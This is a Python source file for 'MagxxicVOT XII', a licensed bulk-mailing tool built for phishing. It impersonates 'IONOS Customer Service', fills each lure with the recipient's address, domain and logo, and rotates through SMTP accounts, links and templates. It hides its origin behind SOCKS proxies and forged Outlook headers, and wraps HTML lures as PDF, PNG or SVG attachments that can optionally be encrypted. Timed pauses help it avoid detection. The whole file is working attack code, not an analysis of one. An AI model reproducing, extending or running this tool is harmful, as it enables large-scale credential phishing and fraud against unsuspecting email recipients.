import os
import sys
import time
import base64
import hashlib
import random
import string
import smtplib
import socket
import ssl
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import requests
import barcode
from barcode.writer import ImageWriter
from io import BytesIO
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich import box
import socks
from urllib.parse import urlparse

# Initialize Console
console = Console()

# Configuration (Defaults)
CONFIG = {
    "sender_name": "IONOS Customer Service",
    "letters_dir": "letters",
    "subjects_path": "subject.txt",
    "links_path": "links.txt",
    "proxies_path": "proxies.txt",
    "email_list_path": "list.txt",
    "smtp_path": "smtp.txt",
    "attachment_html_path": "attachment.html",
    "delay": 1.0, # Fast by default
    "use_proxy": True,
    "auto_validate_proxies": True,
    "attachment_type": "pdf", # "pdf", "png", "svg", "html", or "none"
    "pdf_name": "Document",
    "encrypt_attachment": False,
    "encryption_password": "MaghxSecurePassword",
    "sign_attachment": True,
    "minify_html": True,
    "use_custom_from": True,
    "retry_attempts": 3,
    "pause_every": 100,
    "pause_time": 300, # 5 minutes in seconds
    "test_email": "serverbank@aol.com",
    "test_every": 100
}

stats = {"sent": 0, "success": 0, "failed": 0, "current_proxy": "None"}

def get_hwid():
    import uuid
    hwid_info = f"{socket.gethostname()}-{sys.platform}-{uuid.getnode()}"
    return hashlib.sha256(hwid_info.encode()).hexdigest()[:16].upper()

def deobfuscate(s):
    try: return base64.b64decode(s[::-1].encode()).decode()
    except: return ""

def obfuscate(s): return base64.b64encode(s.encode()).decode()[::-1]

def check_activation():
    hwid, activation_file = get_hwid(), "activation.sys"
    expected = hashlib.sha256((hwid + "MAGXXICVOT-SALT").encode()).hexdigest()[:16].upper()
    if os.path.exists(activation_file):
        with open(activation_file, "r") as f:
            if deobfuscate(f.read().strip()) == expected:
                console.print(Panel(f"[green]✔ License activated successfully.[/green]", box=box.ROUNDED, style="bold green"))
                return
    console.print(Panel(f"[bold yellow]Your HWID:[/bold yellow] [cyan]{hwid}[/cyan]", box=box.DOUBLE, title="Activation Required", style="bold magenta"))
    entered = console.input("[bold magenta]Please enter your activation token: [/bold magenta]").strip().upper()
    if entered == expected:
        console.print("[green]✔ Token validated. Activating...[/green]")
        with open(activation_file, "w") as f: f.write(obfuscate(entered))
        if os.name == 'nt':
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(activation_file, 0x02)
    else:
        console.print("[bold red]✘ Error: Invalid activation token. Please contact the administrator.[/bold red]"); sys.exit(1)

def print_banner():
    banner = """
███╗   ███╗ █████╗  ██████╗ ██╗  ██╗██╗  ██╗██╗ ██████╗██╗   ██╗ ██████╗ ████████╗  ██╗  ██╗██╗██╗
████╗ ████║██╔══██╗██╔════╝ ██║  ██║╚██╗██╔╝██║██╔════╝██║   ██║██╔═══██╗╚══██╔══╝  ╚██╗██╔╝██║██║
██╔████╔██║███████║██║  ███╗███████║ ╚███╔╝ ██║██║     ██║   ██║██║   ██║   ██║      ╚███╔╝ ██║██║
██║╚██╔╝██║██╔══██║██║   ██║██╔══██║ ██╔██╗ ██║██║     ╚██╗ ██╔╝██║   ██║   ██║      ██╔██╗ ██║██║
██║ ╚═╝ ██║██║  ██║╚██████╔╝██║  ██║██╔╝ ██╗██║╚██████╗ ╚████╔╝ ╚██████╔╝   ██║     ██╔╝ ██╗██║██║
╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═══╝   ╚═════╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝
"""
    console.print(banner, style="bold magenta")
    console.print(Panel("[bold cyan]MagxxicVOT XII Python Edition v2.0[/bold cyan]\n[blue]Ultra Speed & Stealth Edition[/blue]", box=box.ROUNDED, style="bold blue"))

def generate_barcode(data):
    try:
        EAN = barcode.get_barcode_class('code128')
        ean = EAN(data, writer=ImageWriter())
        fp = BytesIO()
        ean.write(fp)
        return base64.b64encode(fp.getvalue()).decode()
    except: return ""

def replace_tags(text, replacements):
    new_text = text
    new_text = new_text.replace("[-email-]", replacements.get("-email-", ""))
    new_text = new_text.replace("[-emailuser-]", replacements.get("-emailuser-", ""))
    new_text = new_text.replace("[-emaildomain-]", replacements.get("-emaildomain-", ""))
    new_text = new_text.replace("[-emaildomainname-]", replacements.get("-emaildomainname-", ""))
    new_text = new_text.replace("[-link-]", replacements.get("-link-", ""))
    new_text = re.sub(r'\[-randomstring-\]', lambda _: ''.join(random.choices(string.ascii_letters + string.digits, k=10)), new_text)
    new_text = re.sub(r'\[-randomnumber-\]', lambda _: str(random.randint(1000, 9999)), new_text)
    new_text = re.sub(r'\[-randomletters-\]', lambda _: ''.join(random.choices(string.ascii_letters, k=10)), new_text)
    new_text = re.sub(r'\[-randommd5-\]', lambda _: hashlib.md5(os.urandom(16)).hexdigest(), new_text)
    new_text = re.sub(r'\[-time-\]', lambda _: datetime.now().strftime("%Y-%m-%d %H:%M:%S"), new_text)
    domain = replacements.get("-emaildomain-") or (replacements.get("-email-", "").split("@")[-1] if "@" in replacements.get("-email-", "") else "")
    logo_url = f"https://logo.clearbit.com/{domain}" if domain else ""
    new_text = new_text.replace("[-recipient-logo-]", f'<img src="{logo_url}" alt="Logo" style="max-height: 50px;">')
    matches = re.findall(r'\[-barcode-(.*?)-\]', new_text)
    for data in matches:
        b64 = generate_barcode(data)
        new_text = new_text.replace(f"[-barcode-{data}-]", f'<img src="data:image/png;base64,{b64}" alt="Barcode">')
    return new_text

def encrypt_attachment(data, password):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        key = hashlib.scrypt(password.encode(), salt=b'salt', n=16384, r=8, p=1, dklen=32)
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        pad_len = 16 - (len(data) % 16)
        padded_data = data + bytes([pad_len] * pad_len)
        return iv + encryptor.update(padded_data) + encryptor.finalize()
    except: return data

def get_stats_table():
    table = Table(box=box.MINIMAL_DOUBLE_HEAD, expand=True, border_style="cyan")
    table.add_column("Metric", style="bold yellow")
    table.add_column("Value", style="bold white", justify="right")
    table.add_row("Total Sent", f"[bold yellow]{stats['sent']}[/bold yellow]")
    table.add_row("Success ✅", f"[bold green]{stats['success']}[/bold green]")
    table.add_row("Failed ❌", f"[bold red]{stats['failed']}[/bold red]")
    table.add_row("Proxy 🌐", f"[bold blue]{stats['current_proxy']}[/bold blue]")
    return Panel(table, title="[bold magenta]MagxxicVOT XII Live Dashboard[/bold magenta]", subtitle="[blue]Status: Fast Mailing...[/blue]", border_style="cyan")

def parse_proxy(proxy_str):
    if not proxy_str.startswith("socks"): proxy_str = "socks5://" + proxy_str
    parsed = urlparse(proxy_str)
    return { "addr": parsed.hostname, "port": parsed.port, "user": parsed.username, "pass": parsed.password, "type": socks.SOCKS5 if "socks5" in parsed.scheme else socks.SOCKS4 }

def validate_proxies(proxies):
    console.print(f"[yellow]Validating {len(proxies)} proxies...[/yellow]")
    valid = []
    for proxy in proxies:
        try:
            p = parse_proxy(proxy)
            conn = socks.create_connection(("www.google.com", 80), proxy_type=p["type"], proxy_addr=p["addr"], proxy_port=p["port"], proxy_username=p["user"], proxy_password=p["pass"], timeout=5)
            conn.close(); valid.append(proxy)
            console.print(f"[green]✔ Proxy {proxy} OK.[/green]")
        except: console.print(f"[red]✘ Proxy {proxy} FAILED.[/red]")
    return valid

def html_to_pdf(html_content):
    try:
        from xhtml2pdf import pisa
        result = BytesIO()
        pisa.CreatePDF(html_content, dest=result)
        return result.getvalue()
    except: return html_content.encode()

def html_to_png(html_content):
    try:
        from html2image import HtmlToImage
        hti = HtmlToImage()
        temp_h, out_p = "temp_att.html", "temp_att.png"
        with open(temp_h, "w", encoding="utf-8") as f: f.write(html_content)
        hti.screenshot(html_file=temp_h, save_as=out_p)
        with open(out_p, "rb") as f: data = f.read()
        for f in [temp_h, out_p]:
            if os.path.exists(f): os.remove(f)
        return data
    except: return html_content.encode()

def html_to_svg(html_content):
    svg = f'<svg xmlns="http://www.w3.org/2000/svg" width="800" height="1000"><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">{html_content}</div></foreignObject></svg>'
    return svg.encode()

def send_emails():
    emails = [l.strip() for l in open(CONFIG["email_list_path"]).readlines() if l.strip()]
    subjects = [l.strip() for l in open(CONFIG["subjects_path"]).readlines() if l.strip()]
    links = [l.strip() for l in open(CONFIG["links_path"]).readlines() if l.strip()]
    smtps = []
    for line in open(CONFIG["smtp_path"]).readlines():
        parts = line.strip().split("|")
        if len(parts) >= 4: smtps.append({"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3], "from": parts[4] if len(parts) > 4 else parts[2]})
    letters = [f for f in os.listdir(CONFIG["letters_dir"]) if f.endswith(".html")]
    proxies = [l.strip() for l in open(CONFIG["proxies_path"]).readlines() if l.strip()]

    if CONFIG["use_proxy"] and CONFIG["auto_validate_proxies"] and proxies: proxies = validate_proxies(proxies)
    if not smtps: console.print("[bold red]✘ No SMTP configurations found.[/bold red]"); return
    smtp_idx, sub_idx, link_idx, let_idx, prx_idx, test_count = 0, 0, 0, 0, 0, 0

    with Live(get_stats_table(), refresh_per_second=4) as live:
        for email in emails:
            attempts, sent = 0, False
            while attempts < CONFIG["retry_attempts"] and not sent:
                try:
                    smtp, proxy = smtps[smtp_idx], proxies[prx_idx] if CONFIG["use_proxy"] and proxies else None
                    stats["current_proxy"] = proxy or "Direct"; live.update(get_stats_table())
                    reps = {"-email-": email, "-emailuser-": email.split("@")[0], "-emaildomain-": email.split("@")[1], "-emaildomainname-": email.split("@")[1].split(".")[0], "-link-": links[link_idx] if links else ""}
                    msg = MIMEMultipart()
                    msg["Subject"] = replace_tags(subjects[sub_idx] if subjects else "Update", reps)
                    msg["From"] = f'"{replace_tags(CONFIG["sender_name"], reps)}" <{CONFIG["use_custom_from"] and smtp["from"] or smtp["user"]}>'
                    msg["To"] = email
                    msg["X-Mailer"], msg["X-Priority"], msg["Importance"], msg["X-MSMail-Priority"], msg["X-Originating-IP"] = "Microsoft Outlook 16.0", "1 (Highest)", "High", "High", "127.0.0.1"

                    with open(os.path.join(CONFIG["letters_dir"], letters[let_idx]), "r", encoding="utf-8") as f: content = f.read()
                    msg.attach(MIMEText(replace_tags(content, reps), "html"))

                    if CONFIG["attachment_type"] != "none":
                        att_html = replace_tags(open(CONFIG["attachment_html_path"]).read(), reps)
                        try:
                            import minify_html
                            if CONFIG["minify_html"]: att_html = minify_html.minify(att_html, minify_js=True, remove_processing_instructions=True)
                        except: pass
                        att_name = replace_tags(CONFIG["pdf_name"], reps)
                        if CONFIG["attachment_type"] == "pdf": data, ext, ctype = html_to_pdf(att_html), ".pdf", "application/pdf"
                        elif CONFIG["attachment_type"] == "png": data, ext, ctype = html_to_png(att_html), ".png", "image/png"
                        elif CONFIG["attachment_type"] == "svg": data, ext, ctype = html_to_svg(att_html), ".svg", "image/svg+xml"
                        else: data, ext, ctype = att_html.encode(), ".html", "text/html"
                        if CONFIG["encrypt_attachment"]: data, ext = encrypt_attachment(data, CONFIG["encryption_password"]), ext + ".enc"
                        part = MIMEBase(*ctype.split("/")); part.set_payload(data); encoders.encode_base64(part); part.add_header("Content-Disposition", f'attachment; filename="{att_name}{ext}"'); msg.attach(part)
                        if CONFIG["sign_attachment"]: sig = hashlib.sha256(data).hexdigest(); part_sig = MIMEBase("text", "plain"); part_sig.set_payload(sig.encode()); part_sig.add_header("Content-Disposition", f'attachment; filename="{att_name}{ext}.sig"'); msg.attach(part_sig)

                    def get_conn():
                        if proxy:
                            p = parse_proxy(proxy)
                            return socks.create_connection((smtp["host"], smtp["port"]), proxy_type=p["type"], proxy_addr=p["addr"], proxy_port=p["port"], proxy_username=p["user"], proxy_password=p["pass"], timeout=30)
                        return socket.create_connection((smtp["host"], smtp["port"]), timeout=30)

                    conn = get_conn(); server = smtplib.SMTP(timeout=30); server.sock, server._host = conn, smtp["host"]
                    server.ehlo_or_helo_if_needed()
                    if server.has_extn('starttls'): server.starttls(); server.ehlo_or_helo_if_needed()
                    server.login(smtp["user"], smtp["pass"]); server.send_message(msg); server.quit()
                    stats["sent"], stats["success"], sent, test_count = stats["sent"] + 1, stats["success"] + 1, True, test_count + 1
                    if test_count >= CONFIG["test_every"]:
                        try:
                            test_msg = MIMEMultipart(); test_msg["Subject"], test_msg["From"], test_msg["To"] = f"[TEST] {msg['Subject']}", msg["From"], CONFIG["test_email"]
                            for p in msg.get_payload(): test_msg.attach(p)
                            s = smtplib.SMTP(smtp["host"], smtp["port"], timeout=30); s.starttls(); s.login(smtp["user"], smtp["pass"]); s.send_message(test_msg); s.quit()
                        except: pass
                        test_count = 0
                except:
                    attempts += 1
                    if attempts >= CONFIG["retry_attempts"]: stats["sent"], stats["failed"] = stats["sent"] + 1, stats["failed"] + 1
                    else: smtp_idx = (smtp_idx + 1) % len(smtps); prx_idx = (prx_idx + 1) % (len(proxies) or 1); time.sleep(1)

            if stats["success"] > 0 and stats["success"] % CONFIG["pause_every"] == 0: time.sleep(CONFIG["pause_time"])
            smtp_idx, prx_idx, sub_idx, link_idx, let_idx = (smtp_idx + 1) % len(smtps), (prx_idx + 1) % (len(proxies) or 1), (sub_idx + 1) % len(subjects), (link_idx + 1) % len(links), (let_idx + 1) % len(letters)
            time.sleep(CONFIG["delay"])

def run():
    check_activation(); print_banner()
    console.print(Panel("[bold magenta]Settings Dashboard[/bold magenta]", box=box.SQUARE, style="bold cyan"))
    CONFIG["use_custom_from"] = console.input("[bold blue]Use Custom From Email? (y/n): [/bold blue]").lower() == 'y'
    CONFIG["use_proxy"] = console.input("[bold blue]Use SOCKS Proxy? (y/n): [/bold blue]").lower() == 'y'
    CONFIG["attachment_type"] = console.input("[bold blue]Attachment (pdf/png/svg/html/none): [/bold blue]").lower()
    if CONFIG["attachment_type"] != "none": CONFIG["pdf_name"] = console.input("[bold blue]Filename (tags OK): [/bold blue]") or "Document"
    CONFIG["delay"] = float(console.input("[bold blue]Delay (seconds): [/bold blue]") or 1.0)
    console.print("\n[bold green]✔ Starting Ultra Speed campaign...[/bold green]\n"); time.sleep(1); send_emails()

if __name__ == "__main__": run()
